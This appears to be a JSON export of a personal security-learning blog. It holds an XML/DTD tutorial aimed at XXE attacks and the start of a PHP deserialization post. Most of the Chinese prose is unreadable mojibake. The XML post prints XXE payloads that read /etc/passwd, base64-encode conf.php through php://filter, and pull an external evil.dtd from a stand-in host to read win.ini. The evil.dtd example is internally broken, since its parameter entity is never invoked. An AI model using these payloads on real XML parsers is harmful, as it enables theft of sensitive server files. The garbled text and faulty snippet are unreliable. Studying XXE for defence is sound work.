{"meta":{"title":"Al0nez's Bolg","subtitle":"æˆ‘ä¸æ˜¥é£çš†è¿‡å®¢,ä½ æºç§‹æ°´æ½æ˜Ÿæ²³","description":null,"author":"Al0nez","url":"https://Al0nez.github.io","root":"/"},"pages":[{"title":"åˆ†ç±»&æ ‡ç­¾","date":"2021-09-10T02:30:39.000Z","updated":"2021-09-10T02:33:48.948Z","comments":true,"path":"tags/index.html","permalink":"https://al0nez.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"XMLå­¦ä¹ ","slug":"XMLå­¦ä¹ ","date":"2021-09-22T07:07:29.000Z","updated":"2021-09-22T07:08:44.736Z","comments":true,"path":"2021/09/22/XMLå­¦ä¹ /","link":"","permalink":"https://al0nez.github.io/2021/09/22/XML%E5%AD%A6%E4%B9%A0/","excerpt":"è¦å­¦ä¹ XXEæ¼æ´ï¼Œæ‰€ä»¥å…ˆå­¦ä¹ ä¸€ä¸‹XML","text":"è¦å­¦ä¹ XXEæ¼æ´ï¼Œæ‰€ä»¥å…ˆå­¦ä¹ ä¸€ä¸‹XML ä»€ä¹ˆæ˜¯ XMLï¼Ÿ XML æŒ‡å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼ˆEXtensible Markup Languageï¼‰ã€‚ XML æ˜¯ä¸€ç§å¾ˆåƒHTMLçš„æ ‡è®°è¯­è¨€ã€‚ XML çš„è®¾è®¡å®—æ—¨æ˜¯ä¼ è¾“æ•°æ®ï¼Œè€Œä¸æ˜¯æ˜¾ç¤ºæ•°æ®ã€‚ XML æ ‡ç­¾æ²¡æœ‰è¢«é¢„å®šä¹‰ã€‚æ‚¨éœ€è¦è‡ªè¡Œå®šä¹‰æ ‡ç­¾ã€‚ XML è¢«è®¾è®¡ä¸ºå…·æœ‰è‡ªæˆ‘æè¿°æ€§ã€‚ XML æ˜¯ W3C çš„æ¨èæ ‡å‡†ã€‚ XML å’Œ HTML ä¹‹é—´çš„å·®å¼‚XML ä¸æ˜¯ HTML çš„æ›¿ä»£ã€‚ XML å’Œ HTML ä¸ºä¸åŒçš„ç›®çš„è€Œè®¾è®¡ï¼š XML è¢«è®¾è®¡ç”¨æ¥ä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å†…å®¹ã€‚ HTML è¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å¤–è§‚ã€‚ HTML æ—¨åœ¨æ˜¾ç¤ºä¿¡æ¯ï¼Œè€Œ XML æ—¨åœ¨ä¼ è¾“ä¿¡æ¯ã€‚ XMLæ ‘ç»“æ„XMLæ–‡æ¡£å®ä¾‹1234567&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27;?&gt;&lt;note&gt; &lt;to&gt;Tove&lt;/to&gt; &lt;form&gt;Jani&lt;/form&gt; &lt;heading&gt;Reminder&lt;/heading&gt; &lt;body&gt;Don&#x27;t forget me this weekend!&lt;/body&gt;&lt;/note&gt; 1&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27;?&gt; è¿™æ˜¯XMLçš„å£°æ˜ï¼Œå®šä¹‰äº†XMLçš„ç‰ˆæœ¬å’Œç¼–ç ã€‚ 1&lt;note&gt;&lt;/note&gt; è¿™æ˜¯XMLçš„æ ¹å…ƒç´ ï¼ŒXMLå¿…é¡»è¦åŒ…å«æ ¹å…ƒç´ ï¼Œæ ¹å…ƒç´ æ˜¯å…¶ä»–å…ƒç´ çš„çˆ¶å…ƒç´ ã€‚ 1234&lt;to&gt;Tove&lt;/to&gt; &lt;form&gt;Jani&lt;/form&gt; &lt;heading&gt;Reminder&lt;/heading&gt; &lt;body&gt;Don&#x27;t forget me this weekend!&lt;/body&gt; ä½äºæ ¹å…ƒç´ ä¸­çš„å°±æ˜¯å…¶å­å…ƒç´ ï¼Œç›¸åŒå±‚çº§ä¸Šçš„å­å…ƒç´ æˆä¸ºåŒèƒ XMLè¯­æ³•XMLå£°æ˜XMLå£°æ˜æ–‡ä»¶æ˜¯å¯é€‰éƒ¨åˆ†ï¼Œå¦‚æœå­˜åœ¨éœ€è¦æ”¾åœ¨ç¬¬ä¸€è¡Œ 1&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27;?&gt; æ‰€æœ‰çš„å…ƒç´ å¿…é¡»è¦åŒ…å«ä¸€ä¸ªå…³é—­æ ‡ç­¾12&lt;to&gt;&lt;/to&gt;&lt;br /&gt; **æ³¨:**å£°æ˜æ–‡ä»¶ä¸æ˜¯XMLçš„ä¸€éƒ¨åˆ†ï¼Œæ‰€æœ‰ä¸éœ€è¦å…³é—­æ ‡ç­¾ XML æ ‡ç­¾å¯¹å¤§å°å†™æ•æ„ŸXMLå¯¹å¤§å°å†™æ•æ„Ÿæ‰€æœ‰å¿…é¡»è¦ä½¿ç”¨ä¸€æ ·çš„å¤§å°å†™ 12&lt;Message&gt;è¿™æ˜¯é”™è¯¯çš„&lt;/message&gt;&lt;message&gt;è¿™æ˜¯æ­£ç¡®çš„&lt;/message&gt; XMLå¿…é¡»è¦æ­£ç¡®åµŒå¥—XMLä¸åƒHTMLä¸€æ ·ï¼Œæ ‡ç­¾æ²¡æœ‰æ­£ç¡®åµŒå¥—ä¹Ÿå¯ä»¥ã€‚XMLä¸­æ ‡ç­¾å¿…é¡»è¢«æ­£ç¡®åµŒå¥— 1&lt;b&gt;&lt;i&gt;This text is bold and italic&lt;/i&gt;&lt;/b&gt; XMLå±æ€§å¿…é¡»åŠ å¼•å·XMLä¸­ä¹Ÿå¯ä»¥æ‹¥æœ‰å±æ€§ï¼Œä½†æ˜¯å¿…é¡»è¦åŠ å¼•å·ï¼Œä¸åŠ å¼•å·æ˜¯é”™è¯¯çš„ã€‚ 12&lt;note date=&quot;12/11/2007&quot;&gt;&lt;/note&gt; å®ä½“å¼•ç”¨XMLä¸­&lt;æ˜¯æœ‰ç‰¹æ®Šæ„ä¹‰çš„ï¼Œå®ƒä»£è¡¨ä¸€ä¸ªæ–°å…ƒç´ çš„å¼€å§‹ï¼Œæ‰€ä»¥å¦‚æœä½ å°†&lt;æ”¾å…¥XMLå…ƒç´ ä¸­ä¼šå‘ç”Ÿé”™è¯¯ 1&lt;message&gt;if salary &lt; 1000 then&lt;/message&gt; &lt;!--ä¼šç”ŸæˆXMLé”™è¯¯--&gt; ä¸ºäº†é¿å…è¿™æ ·çš„é”™è¯¯ï¼ŒXMLè§„å®šäº†ä½¿ç”¨å¼•ç”¨å®ä½“ä»£æ›¿è¿™äº›ç‰¹æ®Šå­—ç¬¦ åœ¨ XML ä¸­ï¼Œæœ‰ 5 ä¸ªé¢„å®šä¹‰çš„å®ä½“å¼•ç”¨ï¼š æ³¨é‡Šï¼šåœ¨ XML ä¸­ï¼Œåªæœ‰å­—ç¬¦ â€œ&lt;â€ å’Œ â€œ&amp;â€ ç¡®å®æ˜¯éæ³•çš„ã€‚å¤§äºå·æ˜¯åˆæ³•çš„ï¼Œä½†æ˜¯ç”¨å®ä½“å¼•ç”¨æ¥ä»£æ›¿å®ƒæ˜¯ä¸€ä¸ªå¥½ä¹ æƒ¯ã€‚ XMLçš„æ³¨é‡Š1&lt;!--XMLæ³¨é‡Š--&gt; XMLä¸­çš„ç©ºæ ¼ä¼šè¢«ä¿ç•™HTMLä¼šå°†ä»£ç ä¸­çš„å¤šä¸ªç©ºæ ¼åˆå¹¶ä¸ºä¸€ä¸ªï¼Œè€ŒXMLä¸ä¼š 123456789HTML:hello word====&gt;hello wordXML:hello word=====&gt;hello word XMLå…ƒç´ XMLæ–‡æ¡£åŒ…å«XMLå…ƒç´  ä»€ä¹ˆæ˜¯XMLå…ƒç´ XML å…ƒç´ æŒ‡çš„æ˜¯ä»ï¼ˆä¸”åŒ…æ‹¬ï¼‰å¼€å§‹æ ‡ç­¾ç›´åˆ°ï¼ˆä¸”åŒ…æ‹¬ï¼‰ç»“æŸæ ‡ç­¾çš„éƒ¨åˆ†ã€‚ ä¸€ä¸ªå…ƒç´ å¯ä»¥åŒ…å«ï¼š å…¶ä»–å…ƒç´  æ–‡æœ¬ å±æ€§ æˆ–æ··åˆä»¥ä¸Šæ‰€æœ‰â€¦ XML å‘½åè§„åˆ™XML å…ƒç´ å¿…é¡»éµå¾ªä»¥ä¸‹å‘½åè§„åˆ™ï¼š åç§°å¯ä»¥åŒ…å«å­—æ¯ã€æ•°å­—ä»¥åŠå…¶ä»–çš„å­—ç¬¦ åç§°ä¸èƒ½ä»¥æ•°å­—æˆ–è€…æ ‡ç‚¹ç¬¦å·å¼€å§‹ åç§°ä¸èƒ½ä»¥å­—æ¯ xmlï¼ˆæˆ–è€… XMLã€Xml ç­‰ç­‰ï¼‰å¼€å§‹ åç§°ä¸èƒ½åŒ…å«ç©ºæ ¼ å¯ä½¿ç”¨ä»»ä½•åç§°ï¼Œæ²¡æœ‰ä¿ç•™çš„å­—è¯ã€‚ XMLå±æ€§XMLå…ƒç´ å…·æœ‰å±æ€§ï¼Œå±æ€§å¯ä»¥æä¾›å…ƒç´ ä»¥å¤–çš„ä¸œè¥¿ã€‚å±æ€§åå’Œå…ƒç´ åä¸€æ ·XMLéƒ½æ²¡æœ‰è§„å®šï¼Œè‡ªå·±å®šä¹‰å°±è¡Œã€‚ å±æ€§é€šå¸¸æä¾›ä¸å±äºæ•°æ®ç»„æˆéƒ¨åˆ†çš„ä¿¡æ¯ã€‚åœ¨ä¸‹é¢çš„å®ä¾‹ä¸­ï¼Œæ–‡ä»¶ç±»å‹ä¸æ•°æ®æ— å…³ï¼Œä½†æ˜¯å¯¹éœ€è¦å¤„ç†è¿™ä¸ªå…ƒç´ çš„è½¯ä»¶æ¥è¯´å´å¾ˆé‡è¦ï¼š 1&lt;file type=&quot;gif&quot;&gt;computer.gif&lt;/file&gt; XMLå±æ€§å¿…é¡»åŠ å¼•å·XMLå±æ€§å¯ä»¥ä½¿ç”¨å•å¼•å·ä¹Ÿå¯ä»¥ä½¿ç”¨åŒå¼•å·ï¼Œæˆ–è€…æ˜¯XMLå®ä½“ 123&lt;person sex = &quot;female&quot;&gt;&lt;/person&gt;&lt;person sex = &#x27;female&#x27;&gt;&lt;/person&gt;&lt;person sex = &quot;George &amp;quot;Shotgun&amp;quot; Ziegler&quot;&gt;&lt;/person&gt; é¿å…XMLå±æ€§åœ¨XMLä¸­ï¼Œèƒ½å¤Ÿä½¿ç”¨å…ƒç´ å°½é‡ä¸è¦ä½¿ç”¨å…ƒç´ ã€‚ 1234&lt;person sex=&quot;female&quot;&gt;&lt;firstname&gt;Anna&lt;/firstname&gt;&lt;lastname&gt;Smith&lt;/lastname&gt;&lt;/person&gt; 12345&lt;person&gt;&lt;sex&gt;female&lt;/sex&gt;&lt;firstname&gt;Anna&lt;/firstname&gt;&lt;lastname&gt;Smith&lt;/lastname&gt;&lt;/person&gt; å› ä½¿ç”¨å±æ€§è€Œå¼•èµ·çš„ä¸€äº›é—®é¢˜ï¼š å±æ€§ä¸èƒ½åŒ…å«å¤šä¸ªå€¼ï¼ˆå…ƒç´ å¯ä»¥ï¼‰ å±æ€§ä¸èƒ½åŒ…å«æ ‘ç»“æ„ï¼ˆå…ƒç´ å¯ä»¥ï¼‰ å±æ€§ä¸å®¹æ˜“æ‰©å±•ï¼ˆä¸ºæœªæ¥çš„å˜åŒ–ï¼‰ ä¸è¦åšè¿™æ ·çš„è ¢äº‹ï¼ˆè¿™ä¸æ˜¯ XML åº”è¯¥è¢«ä½¿ç”¨çš„æ–¹å¼ï¼‰ï¼š 12&lt;note day=&quot;10&quot; month=&quot;01&quot; year=&quot;2008&quot; to=&quot;Tove&quot; from=&quot;Jani&quot; heading=&quot;Reminder&quot; body=&quot;Don&#x27;t forget me this weekend!&quot;&gt;&lt;/note&gt; å½“XMLéœ€è¦æ˜¯ç”¨IDè¿›è¡Œæ ‡è¯†XMLå…ƒç´ çš„æ—¶å€™å¯ä»¥ä½¿ç”¨å±æ€§è¿›è¡Œæ ‡è¯†ï¼Œå…¶ä»–æ—¶å€™è¯·å°½é‡ä½¿ç”¨å…ƒç´ ã€‚ XMLéªŒè¯æ‹¥æœ‰æ­£ç¡®è¯­æ³•çš„ XML è¢«ç§°ä¸ºâ€å½¢å¼è‰¯å¥½â€çš„ XMLã€‚ é€šè¿‡ DTD éªŒè¯çš„XMLæ˜¯â€åˆæ³•â€çš„ XMLã€‚ éªŒè¯XMLæ–‡æ¡£åˆæ³•çš„ XML æ–‡æ¡£æ˜¯â€å½¢å¼è‰¯å¥½â€çš„ XML æ–‡æ¡£ï¼Œè¿™ä¹Ÿç¬¦åˆæ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆDTDï¼‰çš„è§„åˆ™ï¼š 12345678&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE note SYSTEM &quot;Note.dtd&quot;&gt;&lt;note&gt;&lt;to&gt;Tove&lt;/to&gt;&lt;from&gt;Jani&lt;/from&gt;&lt;heading&gt;Reminder&lt;/heading&gt;&lt;body&gt;Don&#x27;t forget me this weekend!&lt;/body&gt;&lt;/note&gt; åœ¨ä¸Šé¢çš„å®ä¾‹ä¸­ï¼ŒDOCTYPE å£°æ˜æ˜¯å¯¹å¤–éƒ¨ DTD æ–‡ä»¶çš„å¼•ç”¨ã€‚ä¸‹é¢çš„æ®µè½å±•ç¤ºäº†è¿™ä¸ªæ–‡ä»¶çš„å†…å®¹ã€‚ DTD çš„ç›®çš„æ˜¯å®šä¹‰ XML æ–‡æ¡£çš„ç»“æ„ã€‚å®ƒä½¿ç”¨ä¸€ç³»åˆ—åˆæ³•çš„å…ƒç´ æ¥å®šä¹‰æ–‡æ¡£ç»“æ„ï¼š 12345678&lt;!DOCTYPE note[&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt;]&gt; DTDDTDçš„ä½œç”¨æ˜¯ç”¨æ¥å®šä¹‰XMLæ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å— DTDå¯ä»¥è¢«å£°æ˜åœ¨XMLæ–‡æ¡£å†…ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å¤–éƒ¨å¼•ç”¨æ¥è°ƒç”¨ å†…éƒ¨çš„DOCTYPEå£°æ˜å¦‚æœDTDè¢«å®šä¹‰åˆ°XMLæ–‡æ¡£å†…éƒ¨ 1!DOCTYPE root-element [element-declarations]&gt; XMLæ–‡æ¡£å®ä¾‹ 1234567891011121314&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note [&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt;]&gt;&lt;note&gt;&lt;to&gt;Tove&lt;/to&gt;&lt;from&gt;Jani&lt;/from&gt;&lt;heading&gt;Reminder&lt;/heading&gt;&lt;body&gt;Don&#x27;t forget me this weekend&lt;/body&gt;&lt;/note&gt; !DOCTYPE noteå®šä¹‰äº†æ–‡æ¡£çš„ç±»å‹ï¼Œä»¥[ä¸ºå¼€å§‹]ç»“æŸã€‚å…¶å®å°±æ˜¯noteæ˜¯æ ¹å…ƒç´  !ELEMENT note å®šä¹‰äº†noteå…ƒç´ ä¸­çš„å­å…ƒç´ :â€toã€fromã€heading,ã€bodyâ€ !ELEMENT toå®šä¹‰toå…ƒç´ ä¸º#PCDATA ç±»å‹ !ELEMENT fromå®šä¹‰fromå…ƒç´ ä¸º #PCDATAç±»å‹ !ELEMENT headingå®šä¹‰heading å…ƒç´ ä¸º #PCDATAç±»å‹ !ELEMENT bodyå®šä¹‰body å…ƒç´ ä¸º #PCDATAç±»å‹ å¤–éƒ¨æ–‡æ¡£å£°æ˜DTDä½äºXMLæ–‡ä»¶çš„å¤–éƒ¨ï¼Œé‚£ä¹ˆå®ƒåº”é€šè¿‡ä¸‹é¢çš„è¯­æ³•è¢«å°è£…åœ¨ä¸€ä¸ª DOCTYPE å®šä¹‰ä¸­ï¼š 1&lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt; å¤–éƒ¨å¼•ç”¨ 12345678&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;&lt;note&gt; &lt;to&gt;Tove&lt;/to&gt; &lt;from&gt;Jani&lt;/from&gt; &lt;heading&gt;Reminder&lt;/heading&gt; &lt;body&gt;Don&#x27;t forget me this weekend!&lt;/body&gt;&lt;/note&gt; è¿™æ˜¯åŒ…å« DTD çš„ â€œnote.dtdâ€ æ–‡ä»¶ï¼š 12345&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt; PCDATAPCDATA çš„æ„æ€æ˜¯è¢«è§£æçš„å­—ç¬¦æ•°æ®ï¼ˆparsed character dataï¼‰ã€‚ å¯æŠŠå­—ç¬¦æ•°æ®æƒ³è±¡ä¸º XML å…ƒç´ çš„å¼€å§‹æ ‡ç­¾ä¸ç»“æŸæ ‡ç­¾ä¹‹é—´çš„æ–‡æœ¬ã€‚ PCDATA æ˜¯ä¼šè¢«è§£æå™¨è§£æçš„æ–‡æœ¬ã€‚è¿™äº›æ–‡æœ¬å°†è¢«è§£æå™¨æ£€æŸ¥å®ä½“ä»¥åŠæ ‡è®°. æ–‡æœ¬ä¸­çš„æ ‡ç­¾ä¼šè¢«å½“ä½œæ ‡è®°æ¥å¤„ç†ï¼Œè€Œå®ä½“ä¼šè¢«å±•å¼€ã€‚ ä¸è¿‡ï¼Œè¢«è§£æçš„å­—ç¬¦æ•°æ®ä¸åº”å½“åŒ…å«ä»»ä½• &amp;ã€&lt; æˆ–è€… &gt; å­—ç¬¦ï¼›éœ€è¦ä½¿ç”¨ &amp;amp;ã€&amp;lt; ä»¥åŠ &amp;gt; å®ä½“æ¥åˆ†åˆ«æ›¿æ¢å®ƒä»¬ã€‚ CDATACDATA çš„æ„æ€æ˜¯å­—ç¬¦æ•°æ®ï¼ˆcharacter dataï¼‰ã€‚ CDATA æ˜¯ä¸ä¼šè¢«è§£æå™¨è§£æçš„æ–‡æœ¬ã€‚åœ¨è¿™äº›æ–‡æœ¬ä¸­çš„æ ‡ç­¾ä¸ä¼šè¢«å½“ä½œæ ‡è®°æ¥å¯¹å¾…ï¼Œå…¶ä¸­çš„å®ä½“ä¹Ÿä¸ä¼šè¢«å±•å¼€ã€‚ DTDå…ƒç´ åœ¨ä¸€ä¸ª DTD ä¸­ï¼Œå…ƒç´ é€šè¿‡å…ƒç´ å£°æ˜æ¥è¿›è¡Œå£°æ˜ã€‚ å£°æ˜ä¸€ä¸ªå…ƒç´ 123&lt;!ELEMENT element-name category&gt;æˆ–&lt;!ELEMENT element-name (element-content)&gt; ç©ºå…ƒç´ ç©ºå…ƒç´ é€šè¿‡ä½¿ç”¨ç±»åˆ«å…³é”®å­—EMPTYè¿›è¡Œå£°æ˜ 1&lt;!ELEMENT element-name EMPTY&gt; å®ä¾‹: 123&lt;!ELEMENT br EMPTY&gt; &lt;!--bræ˜¯å…ƒç´ å--&gt;XML example:&lt;br /&gt; åªæœ‰ PCDATA çš„å…ƒç´ åªæœ‰PCDATAçš„å…ƒç´ é€šè¿‡åœ†æ‹¬å·ä¸­çš„#PCDATAè¿›è¡Œå£°æ˜ 123&lt;!ELEMENT element-name (#PCDATA)&gt;å®ä¾‹&lt;!ELEMENT from (#PCDATA)&gt; å¸¦æœ‰ä»»ä½•å†…å®¹çš„å…ƒç´ é€šè¿‡ANYå£°æ˜çš„å…ƒç´ ï¼Œå¯ä»¥åŒ…å«ä»»ä½•å¯è§£ææ•°æ®çš„ç»„åˆ 123&lt;!ELEMNET element-name ANY&gt;å®ä¾‹&lt;!ELEMENT note ANY&gt; DTDä¸­çš„ä¸€äº›é‡è¦çš„å…³é”®å­—ï¼š DOCTYPEï¼ˆDTDçš„å£°æ˜ï¼‰ ENTITYï¼ˆå®ä½“çš„å£°æ˜ï¼‰ SYSTEMã€PUBLICï¼ˆå¤–éƒ¨èµ„æºç”³è¯·ï¼‰ DTDå®ä½“å®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ã€‚ å®ä½“å¼•ç”¨æ˜¯å¯¹å®ä½“çš„å¼•ç”¨ã€‚ å®ä½“å¯åœ¨å†…éƒ¨æˆ–å¤–éƒ¨è¿›è¡Œå£°æ˜ã€‚ å†…éƒ¨å®ä½“å£°æ˜1&lt;!ENTITY entity-name &quot;entity-value&quot;&gt; å®ä¾‹ 123&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe &quot;Thinking&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt; &lt;!--æ³¨æ„è¿™é‡Œè°ƒç”¨å®ä½“éœ€è¦&amp;xxe;--&gt; ä¸€ä¸ªå®ä½“ç”±ä¸‰éƒ¨åˆ†æ„æˆï¼š&amp;ç¬¦å·ã€å®ä½“åç§°ã€åˆ†å·(ï¼›)ï¼Œè¿™é‡Œ&amp;ä¸ç®¡åœ¨GETè¿˜æ˜¯åœ¨POSTä¸­éƒ½éœ€è¦è¿›è¡ŒURLç¼–ç ï¼Œå› ä¸ºæ˜¯ä½¿ç”¨å‚æ•°ä¼ å…¥XMLçš„ï¼Œ&amp;ç¬¦å·ä¼šè¢«è®¤ä¸ºæ˜¯å‚æ•°é—´çš„è¿æ¥ç¬¦å·ã€‚ å¤–éƒ¨å®ä½“å£°æ˜XMLä¸­å¯¹æ•°æ®çš„å¼•ç”¨ç§°ä¸ºå®ä½“ï¼Œå®ä½“ä¸­æœ‰ä¸€ç±»å«å¤–éƒ¨å®ä½“ï¼Œç”¨æ¥å¼•å…¥å¤–éƒ¨èµ„æºï¼Œæœ‰SYSTEMå’ŒPUBLICä¸¤ä¸ªå…³é”®å­—ï¼Œè¡¨ç¤ºå®ä½“æ¥è‡ªæœ¬åœ°è®¡ç®—æœºè¿˜æ˜¯å…¬å…±è®¡ç®—æœºï¼Œå¤–éƒ¨å®ä½“çš„å¼•ç”¨å¯ä»¥å€ŸåŠ©å„ç§åè®®ï¼Œæ¯”å¦‚å¦‚ä¸‹çš„ä¸‰ç§ï¼š 123file:///path/to/file.exthttp://urlphp://filter/read=convert.base64-encode/resource=conf.php å®ä½“å£°æ˜ 1&lt;!ENTITY entity-name SYSTEM &quot;URI/URL&quot;&gt; å¤–éƒ¨å¼•ç”¨å¯æ”¯æŒhttpï¼Œfileç­‰åè®®ï¼Œä¸åŒçš„è¯­è¨€æ”¯æŒçš„åè®®ä¸åŒï¼Œä½†å­˜åœ¨ä¸€äº›é€šç”¨çš„åè®®ï¼Œå…·ä½“å†…å®¹å¦‚ä¸‹æ‰€ç¤ºï¼š å®ä¾‹ 12345678&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE note [ &lt;!ELEMENT name ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;note&gt; &lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/note&gt; è¿™ç§å†™æ³•åˆ™è°ƒç”¨äº†æœ¬åœ°è®¡ç®—æœºçš„æ–‡ä»¶/etc/passwdï¼ŒXMLå†…å®¹è¢«è§£æåï¼Œæ–‡ä»¶å†…å®¹ä¾¿é€šè¿‡&amp;xxeè¢«å­˜æ”¾åœ¨äº†nameå…ƒç´ ä¸­ï¼Œé€ æˆäº†æ•æ„Ÿä¿¡æ¯çš„æ³„éœ²ã€‚ å‚æ•°å®ä½“å£°æ˜123&lt;!ENTITY % entity-name &quot;entity-value&quot;&gt;or&lt;!ENTITY % entity-name SYSTEM â€œURIâ€&gt; ç¤ºä¾‹ï¼š 1234&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY % xxe SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot; &gt;]&gt;&lt;foo&gt;&amp;evil;&lt;/foo&gt; å¤–éƒ¨evil.dtdä¸­çš„å†…å®¹ã€‚ 1&lt;!ENTITY evil SYSTEM â€œfile:///c:/windows/win.iniâ€ &gt; å¼•ç”¨å…¬å…±å®ä½“1&lt;!ENTITY entity-name PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt; å‚è€ƒé“¾æ¥ https://www.cnblogs.com/zhaijiahui/p/9147595.html https://www.runoob.com/xml/xml-tutorial.html","categories":[],"tags":[{"name":"XML","slug":"XML","permalink":"https://al0nez.github.io/tags/XML/"},{"name":"DTD","slug":"DTD","permalink":"https://al0nez.github.io/tags/DTD/"},{"name":"XXE","slug":"XXE","permalink":"https://al0nez.github.io/tags/XXE/"}]},{"title":"37WEBæ¼æ´-ååºåˆ—åŒ–ä¹‹PHP","slug":"37WEBæ¼æ´-ååºåˆ—åŒ–ä¹‹PHP","date":"2021-09-21T02:38:17.000Z","updated":"2021-09-21T05:59:55.362Z","comments":true,"path":"2021/09/21/37WEBæ¼æ´-ååºåˆ—åŒ–ä¹‹PHP/","link":"","permalink":"https://al0nez.github.io/2021/09/21/37WEB%E6%BC%8F%E6%B4%9E-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP/","excerpt":"ç›®å‰åªçœ‹å¾—æ‡‚PHPçš„ååºåˆ—åŒ–ï¼Œjavaæ²¡æœ‰å­¦è¿‡ï¼Œç­‰å­¦åˆ°äº†å†çœ‹","text":"ç›®å‰åªçœ‹å¾—æ‡‚PHPçš„ååºåˆ—åŒ–ï¼Œjavaæ²¡æœ‰å­¦è¿‡ï¼Œç­‰å­¦åˆ°äº†å†çœ‹ å‰è¨€ PHP ååºåˆ—åŒ–åŸç†æœªå¯¹ç”¨æˆ·è¾“å…¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œæ£€æµ‹ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ§åˆ¶ååºåˆ—åŒ–è¿‡ç¨‹ï¼Œä»è€Œå¯¼è‡´ä»£ç æ‰§è¡Œï¼ŒSQL æ³¨å…¥ï¼Œç›®å½•éå†ç­‰ä¸å¯æ§åæœã€‚åœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­è‡ªåŠ¨è§¦å‘äº†æŸäº›é­”æœ¯æ–¹æ³•ã€‚å½“è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™å°±æœ‰å¯èƒ½ä¼šè§¦å‘å¯¹è±¡ä¸­çš„ä¸€äº›é­”æœ¯æ–¹æ³•ã€‚ é­”æœ¯æ–¹æ³• serialize() //å°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆä¸€ä¸ªå­—ç¬¦ä¸² unserialize() //å°†å­—ç¬¦ä¸²è¿˜åŸæˆä¸€ä¸ªå¯¹è±¡ 1è§¦å‘ï¼šunserialize å‡½æ•°çš„å˜é‡å¯æ§ï¼Œæ–‡ä»¶ä¸­å­˜åœ¨å¯åˆ©ç”¨çš„ç±»ï¼Œç±»ä¸­æœ‰é­”æœ¯æ–¹æ³• __construct() //åˆ›å»ºå¯¹è±¡æ—¶è§¦å‘ __destruct() //å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘ __call() //åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘ __callStatic() //åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘ __get() //ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ® __set() //ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§ __isset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨ isset()æˆ– empty()è§¦å‘ __unset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨ unset()æ—¶è§¦å‘ __invoke() //å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘ å…¶ä»–é­”æœ¯æ–¹æ³•1https://www.cnblogs.com/20175211lyz/p/11403397.html åŸºç¡€ æ— ç±»åºåˆ—åŒ–å°†å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²çš„è¿‡ç¨‹ç§°ä¸ºåºåˆ—åŒ– 1234567891011&lt;?php$key = &#x27;zpzp&#x27;;$num = 123;echo serialize($key); //å°†å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²echo &#x27;&lt;br/&gt;&#x27;;echo serialize($num); //å°†å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²?&gt; &gt;&gt;&gt;&gt;&gt;&gt;&gt;s:4:&quot;zpzp&quot;; 